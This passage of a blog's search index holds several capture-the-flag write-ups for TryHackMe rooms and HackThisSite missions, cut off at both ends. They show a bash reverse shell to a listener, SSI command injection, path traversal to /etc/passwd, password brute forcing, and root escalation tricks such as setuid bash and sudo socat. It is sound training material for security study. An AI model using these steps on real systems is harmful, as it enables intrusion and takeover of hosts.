{target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.192.136Host is up (0.11s latency).Not shown: 996 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)| 256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)|_ 256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)53/tcp open tcpwrapped8009/tcp open ajp13 Apache Jserv (Protocol v1.3)| ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS8080/tcp open http Apache Tomcat 9.0.30|_http-favicon: Apache Tomcat|_http-title: Apache Tomcat/9.0.30Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelThere are 4 open ports, we have ssh on port 22 and two web services, ajp13 on port 8009 and http on 8080.WebLet’s navigate to the webpage on port 8080.It’s the default page for Apache Tomcat. Let’s see if we can access the manager panel. http://{Target_IP}:8080/managerWe cant’ access the manager panel.Let’s check if any of the services we found are vulnerable. I wasn’t able to find any vulnerability on Tomcat, but i found the following on ajp:We have a file read/inclusion vulnerability.FootholdLet’s the download the exploit and use it.Great! We managed to retrieve some ssh credentials. Let’s login using those credentials.Great! We’re in. To privilege escalation.Privilege EscalationHorizontalLet’s see what’s on our user’s home directory.We found two files, credentials.pgp and tryhackme.asc, the first file is encrypted with pgp and the second file is a key we can use to decrypt the file. For that, we can use the command gpg to import the key, and then decrypt the file. But when we try to decrypt it, it asks us for a password, but we don’t have one.Let’s download the key file to our machine using scp and try to get a password. scp skyfuck@10.10.192.136:tryhackme.asc .Great, now we can use gpg2john to get a hash, and use john to crack the password.We have successfully cracked the hash and got the password. Let’s go decrypt the credentials.pgp file now.We got the password for the user merlin, let’s switch to that user now. su merlinVerticalLet’s check our current privileges with sudo -l.We can run the command /usr/bin/zip as root. If we chech on GTFPBins, we found an exploit that gives us root access.Let’s copy and paste those commands into the terminal and run them.And just like that we got root.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .Referenceshttps://www.exploit-db.com/exploits/48143https://gtfobins.github.io/gtfobins/zip/#sudo" }, { "title": "TryHackMe - Startup", "url": "/posts/THM-Startup/", "categories": "TryHackMe", "tags": "tryhackme, linux, ftp, wireshark, reverse-shell", "date": "2022-04-23 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Startup from TryHackMe. We start off with nmap scan that reveals 3 open port, we get an FTP server with anonymous login allowed and is linked to the http webserver. We upload a php reverse shell to the ftp server, run it via the webserver and get access to the machine. We find a strange directory in the file system that contains a pcap file, we inspect the file and find a password of a user. Inside that user’s home directory is a scripts that runs regularly, we leverage that to get root.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.61.7Host is up (0.090s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst: | STAT: | FTP server status:| Connected to 10.11.31.131| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)| drwxrwxrwx 2 65534 65534 4096 Nov 12 2020 ftp [NSE: writeable]| -rw-r--r-- 1 0 0 251631 Nov 12 2020 important.jpg|_-rw-r--r-- 1 0 0 208 Nov 12 2020 notice.txt22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)| 256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)|_ 256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Maintenance|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThere are 3 open ports. We have FTP that runs on port 21 and allows anonymous login, SSH on port 22 and HTTP on port 80.FTPSince FTP allows anonymous login, let’s start off with that.To connect to ftp, simply run the command ftp {target_IP}, and provide anonymous as a username, and we can leave the password blank.We logged in successfully, and we find a couple of files there, let’s download them to our machine with the command get {filename}.Let’s inspect these files.The file .test.log has nothing interesting, in the other hand, the file important.txt gives us a possible username. The picture is just an AmongUs meme as mentioned in the text file.WEBMoving to the webserver, let’s navigate to the webpage.It’s a message from the dev team, nothing really useful. Let’s now do some directory busting.FeroxbusterFor directory busting, I’ll be using feroxbuster with the common.txt list.We found files directory, let’s navigate to it.Wow, These are the same files we found on the ftp server.FootholdNow, we our ability to login to ftp with no password, and access the ftp server via the web, let’s upload a php reverse shell to ftp, navigate to it on the webpage and get a shell on the machine.I’ll be using penteste monkey reverse shell, download it and change the ip address to your machine’s ip.Now, put the reverse shell code in your current directory, login to ftp, and use the command put {filename} to upload the file.We managed to upload the file to ftp, now let’s navigate to it in the webpage.We see that the file is there, now before clicking the file, setup a listener on your attacking machine, and then go click the fileWe have successfully recieved a reverse shell on the machine and I used the python pty trick to stabalize my shell. To privesc now.Privilege EscalationHorizontalLet’s inspect this machine and see what we can find.Here we can see an unusual directory, let’s see what’s there.It’s a pcap file, let’s download it and inspect it. To do so, i setup a python http server with the command python3 -m http.server 8000.Now navigate to it on your browser http:{target_IP}:8000/ and you should be able to see the file.Now download the file and open it with wireshark.Looking through the packets, we see a GET request to /files/ftp/shell.php, right after that packet, a new connection opened up(packet 35), and that was similar to what we’ve done to get a reverse shell, let’s inspect the packet number 35 with rightclick -&gt; Follow -&gt; TCP StreamWe are right, it is a reverse shell, looking throught the data, we see a password for lennie, let’s see if it works.Great! We switch to lennie now.VerticalLet’s see what’s on lennie’s home directory.We found 2 directories, Documents and scripts. We inspected Documents and found nothing interesting, now let’s see what’ on scripts.Theres is a bash script named planner.sh and a text file named startup_list.txt, we notice that the text file got edited very recently, and it’s the planner.sh writing it. With that, there must be a cronjob running the planner.sh regularly. Let’s see what the file does.The script writes the content of the variable LIST to startup_list.txt and then runs another script /etc/print.sh which by itself prints Done! to the screen.The print.sh script is owned by our current user lennie, so we can easly modify it.To escalate to root, i added a command to print.sh that gives /bin/bash suid bit so that it can be run as it’s owner which is root.So i added the command, waited a bit and we can see it worked.Now run /bin/bash -p for root.Great! We are root now.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .Referenceshttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" }, { "title": "HackThisSite - Basic mission 11", "url": "/posts/HTS-Basic11/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-04-21 00:00:00 +0000", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Basic mission 11 from HackThisSite. It is the last challenge of this series.SolutionAccording to the description, we have a music site, and it has something to do with Apache. Let’s navigate to the challenge page.We got a message, and every time we refresh the webpage we get similar messages. I love my music! “Candle in the Wind” is the best! I love my music! “Sick City” is the best!I love my music! “The King Must Die” is the best!I googled these sentences and got this.They are songs from someone called Elton John.Let’s view the source code of the page.There is a comment saying there are more stuff if we can find it. Let’s try running a directory/file scan. gobuster dir -w /usr/share/wordlists/dirb/small.txt -u https://www.hackthissite.org/missions/basic/11/ -x php$ gobuster dir -w /usr/share/wordlists/dirb/small.txt -u https://www.hackthissite.org/missions/basic/11/ -x php=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: https://www.hackthissite.org/missions/basic/11/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: php[+] Timeout: 10s===============================================================2022/04/28 07:54:30 Starting gobuster in directory enumeration mode===============================================================/e (Status: 301) [Size: 256] [--&gt; http://www.hackthissite.org/missions/basic/11/e/]/index (Status: 200) [Size: 116] /index.php (Status: 200) [Size: 146]We found /e directory, let’s see what’s there.we found another directory, and even more directories. Following them we get this.Elton, the singer we found earlier, but this directory is empty.One of the hints we got is that Sam doesn’t understand Apache. Some of the import files in Apache are .htaccess files, they are configuration files for the Apache web server that can be used to override certain server configuration options on a per-directory basis using a human readable file.If their contents are exposed, attackers can gain valuable insight into te server configuration and may read sensitive datal.If we run another directory/file scan, we can see that the file is readable.$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/ 1 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/04/28 08:04:39 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 14925]/.htaccess (Status: 200) [Size: 80] /.htpasswd (Status: 403) [Size: 15033]Let’s see what it holds.Beside .htaccess, there is another file on the directory, DaAnswerWe got the message : The answer is not here! Just look a little harder. This is really confusing, but if we think a little, the answer is not here.Now we need a place to submit the password. From our first directory scan, we found index.php page, and this is where we submit the password.Now enter the password ‘not here’ and submit it.Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).Referenceshttps://www.invicti.com/web-vulnerability-scanner/vulnerabilities/htaccess-file-detected/" }, { "title": "TryHackMe - Agent Sudo", "url": "/posts/THM-AgentSudo/", "categories": "TryHackMe", "tags": "tryhackme, linux, easy, burp, hydra, bruteforce, steganography, cracking, john", "date": "2022-04-19 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Agent Sudo from TryHackMe. We start off by a nmap scan where we find 3 open port, ftp-ssh-http. We brute force the user-agent of the webserver to access a hidden page which gives us a hints for ftp. The ftp server contains some pictures that holds hidden files inside them, extracting those files gives us ssh credentials. To escalate our privileges, we find a vulnerable version of sudo on the machine that we leverage to become root.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.129.47Host is up (0.10s latency).Not shown: 997 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)| 256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)|_ 256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: AnnoucementService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThere are 3 open ports: 21 open ftp vsftpd 3.0.3 22 open ssh OpenSSH 7.6p1 80 open http Apache httpd 2.4.29There is no anonymous login for ftp, we have no credentials for ssh so let’s start off by enumerating the http webserver.WebLet’s navigate to the webpage. http://{target_IP}/We have a note from someone called Agent R, telling us we need to use our codename as a user-agent to be able to access the site.The User-Agent request header is a characteristic string that lets servers and network peers identify the application, operating system, vendor, and/or version of the requesting user agent.So we need to change the user-agent header to a codename, but what is this codename. We see that the note is written by Agent R, and the letter R can be the first letter of his name, and there can be other agents like Agent A Agent T for example. So the first letter must be the codename.BurpLet’s fire up burp suite and try to brute force the user-agent header with different Letters. First let’s intercept the request and send it to intruder.Select the user-agent value and press the Add button on the left.Next go to payloads tab, select brute forcer as a payload type, set an A to Z list of characters as charachter set, and set 1 as a min and max lenght.Now start the attack.Now if we filter by length, we can see the correct user-agent.Now intercept a request and replace the user-agent header with the one we found.We got redirected to a page. Therem we got a username, and another message from Agent R telling us that our password is weak!Let’s try brute forcing ftp and see if we can get a password.HydraLet’s hydra to brute force ftp. hydra -l {username} -P /usr/share/wordlists/rockyou.txt {target_IP} ftpGreat! We got a valid password.FTPLet’s now login to ftp using the credentials we have.We found 3 file, we can download them to our machine with get {filename}Let’s see what on the text file.It’s a message from Agent C saying that there is a login password inside a picture. This indicates the use of steganography.SteganographyLet’s start with cutie.png picture. For .png files, we can use binwalk to extract hidden files. binwalk -e cutie.pngWe managed to extract a zip file that contains another message To_AgentR.txt, but it has nothing in it. The zip file must be protected with a password, let’s use zip2john to get a hash and try to crack it.We got a password, let’s extract the zip file and provide the password this time.We are able to read the file now, and it’s a message by Agent R giving us an base64 encoded password we can use with the other alien picture.For the other picture, we can use steghide to extract files from the picture. steghide --extract -sf cute-alien.jpgWe extracted a text file that contains a message from Agent C, giving us a password and username for ssh.FootholdLet’s use the credentials we have to login via ssh.Great! We are in the machine now.Let’s download the Alien picture and look for the incident. To do that, we can use scp to download the picture.And we can upload the picture to google images and get results.Privilege EscalationLet’s check our current privileges on the machine by running sudo -lWe can run execute /bin/bash as any user but not root.Running the command sudo -V we get the Sudo version 1.8.21p2. We google that and get this exploitWe can run sudo -u#-1 /bin/bash and become root.Great! We are root!Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .Referenceshttps://www.exploit-db.com/exploits/47502" }, { "title": "HackThisSite - Basic mission 10", "url": "/posts/HTS-Basic10/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-04-17 00:00:00 +0000", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Basic mission 10 from HackThisSite.SolutionLet’s navigate to the challenge page.Here, we have nothing to work with, but we know that Sam has used a hidden way to authenticate users, and it has something to do with javascript.Let’s check the cookies of the website, on firefox, press F12 and go to Storage.Thers is a cookie named level10_authorized and has it’s value set to no. Let’s change the value to yes.Now refresh the page, check the cookie again and you should be able to see that it is set to yes.To pass the level, just submit a blank password.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .References" }, { "title": "TryHackMe - Anonymous", "url": "/posts/THM-Anonymous/", "categories": "TryHackMe", "tags": "tryhackme, linux, smb, ftp", "date": "2022-04-15 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Anonymous from TryHackMeEnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.50.126 Host is up (0.12s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_drwxrwxrwx 2 111 113 4096 Jun 04 2020 scripts [NSE: writeable]| ftp-syst:| STAT: | FTP server status: | Connected to ::ffff:10.11.31.131| Logged in as ftp | TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 2| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)| 256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)|_ 256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -21m37s, deviation: 0s, median: -21m37s|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-time:| date: 2022-04-03T12:43:56|_ start_date: N/A| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode:| 3.1.1:|_ Message signing enabled but not required| smb-os-discovery:| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: anonymous| NetBIOS computer name: ANONYMOUS\\x00| Domain name: \\x00| FQDN: anonymous|_ System time: 2022-04-03T12:43:56+00:00There are 4 open ports: 21 ftp vsftpd 22 ssh OpenSSH 7.6p1 139 netbios-ssn Samba smbd 445 netbios-ssn Samba smbdLet’s start off by enumerating ftp since it allows anonymous login.FTPWe can connect to the ftp server with ftp {target_IP}, we supply the name as anonymous and we can left the password blank.We found some files on the server, we can download them to our machine using get {filename}.Now that the files are downloaded, let’s see what’s on them.First, we have clean.sh script that seems to be a cleaning script. The to_do.txt file has a note for removing the anonymous login. The third file, removed_file.log, has a bunch of text that’s beings repeated, and it is the same text we saw in the clean.sh script ,so there must be a cronjob that runs clean.sh regularly.SMBWe can check the shares of the smb server by running : sudo smbclient -L {target_IP} -N.We found pics share, we can connect to that share with this command : sudo smbclient //{target_IP}/pics -NThere are two pictures there, i downloaded them using get {filename}, inspected them for hidden content but i got nothing.FootholdWe can use the clean.sh script to get access to the machine, let’s check it’s permissions first.We see that can edit the script. What i did is i created a file with the same name ‘clean.sh’ and put the following script in that file.#!/bin/bash/bin/bash -i &gt;&amp; /dev/tcp/10.11.x.x/9001 0&gt;&amp;1This script sends a reverse shell, so i setup a listener on my machine with nc -lvnp 9001, and uploaded a script to the ftp server using put clean.sh.Waiting for some time, i got the shell.Privilege EscalationFor privesc, I uploaded linpeas and ran it.We found that env has suid binary set, searching for the binary in GTFOBins we found that we can run env /bin/bash -p and get a root shellGreat! We got root access.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 9", "url": "/posts/HTS-Basic9/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-04-13 00:00:00 +0000", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Basic mission 9 from HackThisSite.SolutionLet’s navigate the challenge page.In this level, the password is saved in /9 directory, the script that takes user input and save it in a file is not here, but we can go back to level 8 and use to try to get to the password file.We can use the same payload as last level, but we need to do a slight modification to it. &lt;!--#exec cmd=\"ls ../../9\" --&gt;. Since the password is in /9 directory, we need to go two directories up and list the content of /9.Great! We got the password file name, navigate to it to get the password.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "HackThisSite - Basic mission 8", "url": "/posts/HTS-Basic8/", "categories": "HackThisSite, Basic missions", "tags": "hackthissite, hts, easy, web, basic, html", "date": "2022-04-09 00:00:00 +0000", "snippet": "DescriptionHello l33ts, I hope you are doing well. We will be doing Basic mission 8 from HackThisSite.SolutionLet’s navigate to the challenge page.An unencrypted password file is still there, now we have a program that saves user input into a file, let’s submit a name to see what the program does.We get redirected to this page that tells us to click a link to view the file. Let’s click the link.It says Hi, prints the name we submitted and tells us how many characters the name has. One other thing to notice is the URL : https://www.hackthissite.org/missions/basic/8/tmp/ubjvgnow.shtml. The file has a random string and a .shtml as an extension. I googled shtml exploit and found that it is famously vulnerable to SSI Injection. I found this article that explains how the vulnerability works. In the article i found a payload that would let us list the content of the directory: &lt;!--#exec cmd=\"ls\" --&gt;, let’s submit that as a name and see.We managed to list the content of /tmp directory, we know that the password is up a directory, so let’s run ls .. to see the content of /8 directory, the final payload will look like this &lt;!--#exec cmd=\"ls ..\" --&gt;`Great! We listed the content of the challenge directory and we found the password file, navigate to that file to get the password.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) .Referenceshttps://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection" }, { "title": "TryHackMe - Lazy Admin", "url": "/posts/THM-Lazy-Admin/", "categories": "TryHackMe", "tags": "tryhackme, linux, crack, easy", "date": "2022-04-07 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing LazyAdmin from TryHackMe. We find a webserver running a vulnerableEnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.151.18Host is up (0.099s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)| 256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)|_ 256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe got ssh on port 22 and a http webserver on port 80, let’s check the webserver.WebserverLet’s navigate to the web page.It’s the default page of Apache, nothing useful, let’s run directory scan.Gobuster===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.149.81/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/dirb/wordlists/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/06/13 07:44:21 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/content (Status: 301) [Size: 314] [--&gt; http://10.10.149.81/content/]/index.html (Status: 200) [Size: 11321] /server-status (Status: 403) [Size: 277] ===============================================================We found a directory called /content, let’s navigate to it.We found a welcome page of SweetRice website management system, I searched for SweetRice on Exploitdb and found that it has a backup disclosure vulnerability, this exploit explains how to get a mysql backup.We can navigate to http://{target_IP}/inc/mysql_backup and find a mysql backup file.Let’s download the file to our machine and see what it has for us.The file has the username manager and a password hash that looks like an md5 hash, so we can use crackstation to crack the password.We managed to crack the password, but where to use it.Let’s run another directory scan but this time on /content.===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.151.18/content[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2022/04/08 12:15:07 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 277]/.htaccess (Status: 403) [Size: 277]/.htpasswd (Status: 403) [Size: 277]/_themes (Status: 301) [Size: 322] [--&gt; http://10.10.151.18/content/_themes/]/as (Status: 301) [Size: 317] [--&gt; http://10.10.151.18/content/as/] /attachment (Status: 301) [Size: 325] [--&gt; http://10.10.151.18/content/attachment/]/images (Status: 301) [Size: 321] [--&gt; http://10.10.151.18/content/images/] /inc (Status: 301) [Size: 318] [--&gt; http://10.10.151.18/content/inc/] /index.php (Status: 200) [Size: 2198] /js (Status: 301) [Size: 317] [--&gt; http://10.10.151.18/content/js/] ===============================================================Let’s see what on /as directory, navigate to http://{target_IP}/content/as.Great! We found a login page, let’s use the credentials we found to login.FootholdWe have access, now what? Earlier when we searched for possible exploits, there was an arbitrary file upload exploit in Exploitdb.Download the exploit here and run it with sudo python3 {exploitfile}.We need to provide the target url {target_IP}/content, the username manager, the password we managed to crack, and a php reverse shell, in my case i used this one from pentestmonkeys, the extension of the file has to be php5 for a successful upload.Now let’s set up a listener on our machine with nc -lvnp {port_number} and visit the link the exploit gave us http://target_IP/content/attachment/reverse.php5Great! We managed to get a shell, and i used the python3 pty trick to get a functional shell, now the privesc part.Privilege EscalationLet’s check our privileges by running sudo -lWe can run a perl script as root. We don’t have write permissions on the script so let’s check script does.backup.pl just runs another script called copy.sh, and we have write permissions on that file.I added the following command: chmod +s /bin/bash, this gives suid permission to /bin/bash so that i can run it as it’s owner root, i run the perl script after that and we can see the suid bit got added to /bin/bash.running /bin/bash -p will give us a root shellAnd just like that we have rooted LazyAdmin.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Inclusion", "url": "/posts/THM-Inclusion/", "categories": "TryHackMe", "tags": "tryhackme, linux, sudo, lfi", "date": "2022-04-05 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Inclusion from TryHackMe. It’s an easy machine where we use local file inclusion vulnerability and find a user credentials that gives us access to the machine via ssh. We Find we can run a program as root, we leverage that to become root.EnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.210.218Host is up (0.097s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)| 256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)|_ 256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)80/tcp open http Werkzeug httpd 0.16.0 (Python 3.6.9)|_http-title: My blog|_http-server-header: Werkzeug/0.16.0 Python/3.6.9Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe have ssh on port 22 and a webserver running on port 80, let’s check the webserver.WebserverIt looks like we have a blog with some articles, let’s try clicking on one of the view details buttons.We see in the URL a parameter called name, let’s see if it’s vulnerable to Local file inclusion by requesting the /etc/passwd file, but first, we need to up all the way the root directory of the file system, the payload will like this: ../../../../../etc/passwd.Let’s add it now to the url, http://{target_IP}/article?name=../../../../../etc/passwd Note that we use ctrl + u to view the source code which gives us a nicer view.We found a username and password inside the file.FootholdLet’s use the username and password we found to login with ssh.Great! We are in the machine now, let’s move to privesc.Privilege EscalationWe can run sudo -l to check our current privileges.We can run socat as root, we can go to GTFOBins and see how to use socat to get root.So we can execute the following command sudo socat stdin exec:/bin/sh and become root, let’s try it.Great! And just like that we have rooted the machine.Thank you for taking the time to read my writeup, I hope you have learned something with this, if you have any questions or comments, please feel free to reach out to me. See you in the next hack :) ." }, { "title": "TryHackMe - Bounty Hacker", "url": "/posts/THM-Bounty-Hacker/", "categories": "TryHackMe", "tags": "tryhackme, linux, ftp, hydra, bruteforce, tar, sudo", "date": "2022-04-03 00:00:00 +0000", "snippet": " DescriptionHello l33ts, I hope you are doing well. We are doing Bounty Hacker from TryHackMeEnumerationnmapWe start a nmap scan using the following command: sudo nmap -sC -sV -T4 {target_IP}. -sC: run all the default scripts. -sV: Find the version of services running on the target. -T4: Aggressive scan to provide faster results. Nmap scan report for 10.10.120.252Host is up (0.11s latency).Not shown: 970 filtered tcp ports (no-response), 27 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3| ftp-syst:| STAT:| FTP server status:| Connected to ::ffff:10.11.31.131| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_Can't get directory listing: TIMEOUT22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)| 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)|_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Site doesn't have a title (text/html).|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelWe got 3 open ports 21 ftp vsftpd 3.0.3 22 ssh OpenSSH 7.2p2 80 http Apache httpd 2.4.18FTPFrom the nmap scan we see that Anonymous login is allowed is this ftp server, let’s login and see what we can find.We found two interesting files, locks.txt and task.txt, we can download them to our machine using the command get {filename}. Let’s see what’s on the files.The first file, locks.txt, contains a list of words that i assume are passwords, the other file, task.txt, contains a notes from someone called lin, which is a possible username. Now we the information we have, let’s try to brute 